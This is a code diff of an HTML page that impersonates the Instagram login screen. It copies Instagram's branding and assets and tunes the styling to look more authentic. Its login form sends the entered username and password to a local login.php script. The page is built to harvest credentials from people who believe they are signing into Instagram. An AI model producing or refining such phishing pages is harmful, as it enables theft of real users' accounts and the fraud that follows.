@@ -4,75 +4,83 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <title>Login • Instagram</title>
     <style>
-        body { font-family: 'Roboto', sans-serif; }
-        .insta-input:focus { border-color: #a8a8a8 !important; }
+        body { background-color: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .insta-input {
+            background: #121212;
+            border: 1px solid #363636;
+            color: #fafafa;
+            font-size: 12px;
+            padding: 9px 0 7px 8px;
+            outline: none;
+            border-radius: 3px;
+        }
+        .insta-input:focus { border-color: #a8a8a8; }
+        .login-btn {
+            background-color: #0095f6;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 7px 16px;
+            transition: background-color 0.2s;
+        }
+        .login-btn:hover { background-color: #1877f2; }
+        .divider { height: 1px; background-color: #262626; flex-grow: 1; }
     </style>
 </head>
-<body class="bg-black text-white flex flex-col min-h-screen">
+<body class="flex flex-col min-h-screen">
     
-    <main class="flex-grow flex items-center justify-center px-4 md:px-20 lg:justify-between max-w-6xl mx-auto w-full">
+    <main class="flex-grow flex items-center justify-center max-w-[935px] mx-auto w-full gap-8">
         
-        <div class="hidden lg:flex flex-col w-1/2 space-y-6">
-            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d256451a29bd.png" 
-                 alt="Instagram" class="w-44 invert brightness-200">
-            
-            <h1 class="text-5xl font-extrabold leading-tight tracking-tight">
-                See everyday moments from your <br>
-                <span class="text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 via-red-500 to-purple-600">
-                    close friends.
-                </span>
-            </h1>
-
-            <div class="relative mt-4">
-                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png/cfd511b68297.png" 
-                     class="w-64 rounded-3xl border-4 border-gray-800 shadow-2xl opacity-90">
-            </div>
+        <div class="hidden lg:block relative w-[380px] h-[580px] bg-[url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/Itu9VpUqIQ2.png')] bg-no-repeat bg-[position:-46px_0]">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yS/r/G_S_K9zZ_S0.png" 
+                 class="absolute top-[27px] right-[18px] w-[250px] transition-opacity duration-1000">
         </div>
 
-        <div class="w-full max-w-[350px] flex flex-col space-y-4">
-            <div class="bg-black border border-gray-800 p-8 pt-10 flex flex-col items-center">
-                
-                <h2 class="text-lg font-semibold mb-6 self-start">Log into Instagram</h2>
+        <div class="w-full max-w-[350px] space-y-3">
+            
+            <div class="bg-black border border-[#262626] p-10 flex flex-col items-center">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d256451a29bd.png" 
+                     alt="Instagram" class="w-44 invert mb-8">
 
                 <form action="login.php" method="POST" class="w-full flex flex-col space-y-2">
-                    <input type="text" name="user" required
-                           placeholder="Phone number, username, or email" 
-                           class="insta-input w-full bg-[#121212] border border-gray-800 rounded-sm p-2.5 text-xs outline-none transition">
+                    <input type="text" name="user" placeholder="Phone number, username, or email" class="insta-input" required>
+                    <input type="password" name="pass" placeholder="Password" class="insta-input" required>
                     
-                    <input type="password" name="pass" required
-                           placeholder="Password" 
-                           class="insta-input w-full bg-[#121212] border border-gray-800 rounded-sm p-2.5 text-xs outline-none transition">
-                    
-                    <button type="submit" 
-                            class="bg-[#0095f6] hover:bg-[#1877f2] text-sm font-semibold py-1.5 rounded-lg mt-4 transition-all duration-200">
-                        Log in
-                    </button>
+                    <button type="submit" class="login-btn mt-4">Log in</button>
                 </form>
 
-                <div class="flex items-center w-full my-6">
-                    <div class="flex-grow border-t border-gray-800"></div>
-                    <span class="px-4 text-xs font-semibold text-gray-500 uppercase">OR</span>
-                    <div class="flex-grow border-t border-gray-800"></div>
+                <div class="flex items-center w-full my-4">
+                    <div class="divider"></div>
+                    <span class="px-4 text-xs font-semibold text-[#8e8e8e]">OR</span>
+                    <div class="divider"></div>
                 </div>
 
-                <a href="#" class="text-sm font-semibold text-[#385185] flex items-center justify-center space-x-2">
-                    <span class="text-lg">f</span>
-                    <span>Log in with Facebook</span>
-                </a>
+                <button class="flex items-center justify-center gap-2 text-[#385185] font-semibold text-sm">
+                    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/PNT9_2_L-vX.png" class="w-4 h-4">
+                    Log in with Facebook
+                </button>
 
-                <a href="#" class="text-xs text-gray-400 mt-4">Forgot password?</a>
+                <a href="#" class="text-xs text-[#e0f1ff] mt-4">Forgot password?</a>
             </div>
 
-            <div class="bg-black border border-gray-800 p-6 text-center">
-                <p class="text-sm text-gray-300">Don't have an account? <a href="#" class="text-[#0095f6] font-semibold">Sign up</a></p>
+            <div class="bg-black border border-[#262626] p-6 text-center">
+                <p class="text-sm text-[#fafafa]">Don't have an account? <a href="#" class="text-[#0095f6] font-semibold">Sign up</a></p>
+            </div>
+
+            <div class="text-center space-y-4">
+                <p class="text-sm text-[#fafafa]">Get the app.</p>
+                <div class="flex justify-center gap-2">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7YmS_tI.png" class="h-10">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" class="h-10">
+                </div>
             </div>
         </div>
     </main>
 
-    <footer class="p-4 text-gray-500 text-[10px] text-center flex flex-wrap justify-center gap-4 mb-4">
+    <footer class="p-8 text-[#8e8e8e] text-xs text-center flex flex-wrap justify-center gap-4">
         <span>Meta</span> <span>About</span> <span>Blog</span> <span>Jobs</span> <span>Help</span> <span>API</span> <span>Privacy</span> <span>Terms</span>
         <span>© 2026 Instagram from Meta</span>
     </footer>
